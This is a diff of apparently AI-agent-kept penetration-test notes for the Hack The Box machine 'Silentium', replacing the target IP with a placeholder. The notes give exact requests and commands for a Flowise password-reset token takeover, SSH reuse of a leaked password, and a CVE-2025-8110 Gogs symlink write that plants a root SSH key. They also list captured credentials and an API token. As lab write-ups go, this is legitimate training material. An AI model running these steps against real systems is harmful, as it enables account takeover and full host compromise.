@@ -5,7 +5,7 @@
 
 ## Engagement
 - **Box:** Silentium
-- **Target IP:** 10.129.109.201
+- **Target IP:** $TARGET
 - **Difficulty:** easy
 - **Started:** 2026-10-03
 - **Current Access Level:** **ROOT** on the host (`uid=0(root) gid=0(root)`), via SSH key auth written to `/root/.ssh/authorized_keys`. Also retain host SSH as `ben` (uid=1000) and root-equivalent code exec inside the Flowise Docker container (ephemeral, via CVE-2025-59528).
@@ -19,11 +19,11 @@
 
 ## Web / App Surface
 <!-- endpoint/vhost | tech | notes | evidence file -->
-- `silentium.htb` (10.129.109.201, port 80) | static marketing site ("Silentium | Institutional Capital & Lending Solutions") | Team/Leadership section names 3 staff incl. **"Ben — Head of Financial Systems"** — candidate username, matches operator hint. No other obvious leads in page content beyond team names. | web/index.html, web/whatweb.txt
+- `silentium.htb` ($TARGET, port 80) | static marketing site ("Silentium | Institutional Capital & Lending Solutions") | Team/Leadership section names 3 staff incl. **"Ben — Head of Financial Systems"** — candidate username, matches operator hint. No other obvious leads in page content beyond team names. | web/index.html, web/whatweb.txt
 - `staging.silentium.htb` (same IP, vhost) | **Flowise v3.0.5** (confirmed via `GET /api/v1/ping` -> `pong` and `GET /api/v1/version` -> `{"version":"3.0.5"}`) | Full UI reachable, `/api/v1/chatflows` returns 401 (auth required, consistent with Flowise 3.x enforcing auth by default). Found via targeted vhost guess (not the broad ffuf wordlist — see below) matching operator's "staging subdomain" hint. | web/staging.html, web/staging_direct.html, web/staging_bundle.js
 - `staging-v2-code.dev.silentium.htb` (same IP, port 80, nginx reverse-proxies to `127.0.0.1:3001`) | **CONFIRMED Gogs 0.13.3**, running as a **native systemd service (`gogs.service`) directly on the host as `root`** (NOT in Docker — `ps aux` shows `root 1501 /opt/gogs/gogs/gogs web`; config at `/opt/gogs/gogs/custom/conf/app.ini` has `RUN_USER = root`). Config: `DISABLE_REGISTRATION = false`, `ENABLE_REGISTRATION_CAPTCHA = true`, `REQUIRE_SIGNIN_VIEW = false`, repo root `/root/gogs-repositories`. Found via `/etc/nginx/sites-enabled/staging-v2-code -> sites-available/staging-v2-code` on the host (not discoverable externally without the foothold — confirms operator's stated attack-chain order). | GLOBAL_CONTEXT/this entry; raw nginx config pulled live over SSH.
 - nginx has a default/wildcard server block on port 80: any unrecognized `Host:` header returns `301 Moved Permanently` (178-byte body) — confirmed with 7 other vhost guesses (gogs/internal/git/vcs/code/repo/scm.silentium.htb) which ALL returned the identical 178-byte catch-all during initial external recon; the real vhost name (`staging-v2-code.dev.silentium.htb`) was never in any wordlist and was only found by reading `/etc/nginx/sites-enabled/` on the host after the SSH foothold, exactly as flagged `[unconfirmed]` by the prior recon pass. Once added to `/etc/hosts`, the vhost IS reachable directly from the attacker box over the public port 80 (not restricted to localhost/docker-internal).
-- Added to `/etc/hosts` (attacker Kali box): `10.129.109.201 silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb`
+- Added to `/etc/hosts` (attacker Kali box): `$TARGET silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb`
 
 ## Credentials & Secrets
 <!-- user | secret/hash | source | works on? -->
@@ -42,24 +42,24 @@
   1. `POST http://staging.silentium.htb/api/v1/account/forgot-password` body `{"user":{"email":"ben@silentium.htb"}}` -> 201, response JSON contains `user.tempToken`.
   2. `POST http://staging.silentium.htb/api/v1/account/reset-password` body `{"user":{"email":"ben@silentium.htb","tempToken":"<token>","password":"Pwned123!"}}` -> 201, password changed.
   3. Login via `POST http://staging.silentium.htb/api/v1/auth/login` body `{"email":"ben@silentium.htb","password":"Pwned123!"}` (NOTE: NOT `/api/v1/account/basic-auth` — that returns "Authentication failed"; real login route is `/api/v1/auth/login`, found by reading `assets/auth-15PRqe3J.js` referenced from the React bundle). Returns 200 + sets cookies `token`, `refreshToken`, `connect.sid`. Account is org admin (`isOrganizationAdmin:true`), workspace "Default Workspace".
-  - Cookie jar saved at /tmp/claude-1000/-home-kali-Desktop/ebb07c31-97e2-489a-97cc-c5381d662fee/scratchpad/flowise_cookies.txt (session, will expire — re-run steps above if needed)
+  - Cookie jar saved at <scratchpad>/flowise_cookies.txt (session, will expire — re-run steps above if needed)
   - New password for ben@silentium.htb on Flowise: `Pwned123!`
-- Host SSH | `ben` (uid=1000) | SMTP_PASSWORD leaked from Flowise container env (`r04D!!_R4ge`) reused as the host SSH password for user `ben` | interactive SSH shell (`sshpass -p 'r04D!!_R4ge' ssh ben@10.129.109.201`) | Host: Ubuntu 24.04.4 LTS, kernel 6.8.0-107-generic, hostname `silentium`, x86_64. NOTE: `F1l3_d0ck3r` (FLOWISE_PASSWORD env var) does NOT work for SSH — only the SMTP_PASSWORD does; don't retry FLOWISE_PASSWORD for SSH.
+- Host SSH | `ben` (uid=1000) | SMTP_PASSWORD leaked from Flowise container env (`r04D!!_R4ge`) reused as the host SSH password for user `ben` | interactive SSH shell (`sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET`) | Host: Ubuntu 24.04.4 LTS, kernel 6.8.0-107-generic, hostname `silentium`, x86_64. NOTE: `F1l3_d0ck3r` (FLOWISE_PASSWORD env var) does NOT work for SSH — only the SMTP_PASSWORD does; don't retry FLOWISE_PASSWORD for SSH.
   - `sudo -l` confirmed by @PrivEsc_Agent: `ben` **may not run sudo at all** on this host (`Sorry, user ben may not run sudo on silentium.`), tested with both known passwords (`r04D!!_R4ge` and `F1l3_d0ck3r`) — this is a hard dead end, not a password issue.
-- **Host root** | `root` | **CVE-2025-8110 (Gogs symlink PutContents arbitrary file write)** | full interactive SSH as root | Steps (all reproducible from the attacker Kali box once `staging-v2-code.dev.silentium.htb` is in `/etc/hosts` pointing at `10.129.109.201`):
+- **Host root** | `root` | **CVE-2025-8110 (Gogs symlink PutContents arbitrary file write)** | full interactive SSH as root | Steps (all reproducible from the attacker Kali box once `staging-v2-code.dev.silentium.htb` is in `/etc/hosts` pointing at `$TARGET`):
   1. Recon (as `ben` over SSH): `cat /etc/nginx/sites-available/staging-v2-code` revealed `proxy_pass http://127.0.0.1:3001;` for vhost `staging-v2-code.dev.silentium.htb`. `curl -s http://127.0.0.1:3001/` (run on the host) confirmed Gogs. `ps aux` showed `root 1501 ... /opt/gogs/gogs/gogs web` — Gogs runs as **root**, natively via `systemctl` (`gogs.service`), not in a container. `/opt/gogs/gogs/gogs --version` -> `Gogs version 0.13.3`. `/opt/gogs/gogs/custom/conf/app.ini` confirms `RUN_USER = root`, `DISABLE_REGISTRATION = false`, `ENABLE_REGISTRATION_CAPTCHA = true`.
-  2. Added `10.129.109.201 staging-v2-code.dev.silentium.htb` to the Kali `/etc/hosts` — confirmed the vhost is reachable directly on port 80 from the attacker box (nginx proxies it through, no need to tunnel via SSH).
+  2. Added `$TARGET staging-v2-code.dev.silentium.htb` to the Kali `/etc/hosts` — confirmed the vhost is reachable directly on port 80 from the attacker box (nginx proxies it through, no need to tunnel via SSH).
   3. `ben`'s known Gogs-app / SMTP / Flowise credentials do **not** work for Gogs login (`Username or password is not correct.` for all of `r04D!!_R4ge`, `F1l3_d0ck3r`, `Pwned123!`) — `ben` has no pre-existing Gogs account. Self-registered a throwaway account instead (`DISABLE_REGISTRATION=false` permits this): `POST /user/sign_up` with `user_name`, `email`, `password`, `retype`, `captcha_id`, `captcha`, `_csrf`. Gogs' built-in captcha (6-digit distorted number, e.g. "723318") was solved by visual inspection of the fetched PNG (tesseract OCR did not reliably read the distortion; manual image inspection did). Registered `pwnagent:Pwnage123!`.
   4. Created an API token: `POST /api/v1/users/pwnagent/tokens` with HTTP Basic auth (`pwnagent:Pwnage123!`) and body `{"name":"pwntoken"}` -> `sha1` token.
   5. Generated an attacker SSH keypair: `ssh-keygen -t ed25519 -f loot/silentium_root_key -N ""`.
   6. Ran the CVE-2025-8110 PoC (`/tmp/CVE-2025-8110/CVE-2025-8110.py`, from `github.com/3jee/CVE-2025-8110`): `python3 CVE-2025-8110.py --url http://staging-v2-code.dev.silentium.htb -u pwnagent -p 'Pwnage123!' --target-file /root/.ssh/authorized_keys --content-file loot/silentium_root_key.pub`. Internally this: creates a repo via `POST /repo/create`; clones it; creates a local symlink `payload -> /root/.ssh/authorized_keys`; `git add`/`commit`/`push`es the symlink into the repo; then `PUT /api/v1/repos/pwnagent/<repo>/contents/payload` with `{"content":"<base64 of SSH pubkey>","message":"update"}` and `Authorization: token <sha1>` header. Gogs resolves the `payload` symlink on disk and writes the decoded content to the real `/root/.ssh/authorized_keys` as root. Script reported `[+] Write OK`.
-  7. Verified: `ssh -i loot/silentium_root_key root@10.129.109.201 'id; hostname; cat /root/root.txt'` -> `uid=0(root) gid=0(root) groups=0(root)`, hostname `silentium`, root.txt printed.
-  - Private key saved at `/home/kali/Desktop/easy/Silentium/loot/silentium_root_key` (chmod 600), public key at `loot/silentium_root_key.pub`.
+  7. Verified: `ssh -i loot/silentium_root_key root@$TARGET 'id; hostname; cat /root/root.txt'` -> `uid=0(root) gid=0(root) groups=0(root)`, hostname `silentium`, root.txt printed.
+  - Private key saved at `easy/Silentium/loot/silentium_root_key` (chmod 600), public key at `loot/silentium_root_key.pub`.
   - New Gogs credentials created during exploitation: `pwnagent` / `Pwnage123!` (throwaway account, API token `70eab2df7ae368f7421c9953694c5d55f6943a99`).
 
 ## Flags
-- **user.txt:** [x] `[REDACTED-HTB-FLAG]` — captured via `ssh ben@10.129.109.201 "cat ~/user.txt"` (/home/ben/user.txt)
-- **root.txt:** [x] `[REDACTED-HTB-FLAG]` — captured via `ssh -i loot/silentium_root_key root@10.129.109.201 "cat /root/root.txt"`. Saved locally at `/home/kali/Desktop/easy/Silentium/loot/root.txt`.
+- **user.txt:** [x] `[REDACTED-HTB-FLAG]` — captured via `ssh ben@$TARGET "cat ~/user.txt"` (/home/ben/user.txt)
+- **root.txt:** [x] `[REDACTED-HTB-FLAG]` — captured via `ssh -i loot/silentium_root_key root@$TARGET "cat /root/root.txt"`. Saved locally at `easy/Silentium/loot/root.txt`.
 
 ## PrivEsc Quick-Wins Checklist (standard methodology, run in parallel with the Gogs lead)
 - `sudo -l` as `ben` (both passwords `r04D!!_R4ge` and `F1l3_d0ck3r`): **dead end** — `ben` is not in `/etc/sudoers` at all (`Sorry, user ben may not run sudo on silentium.`), not a password problem.
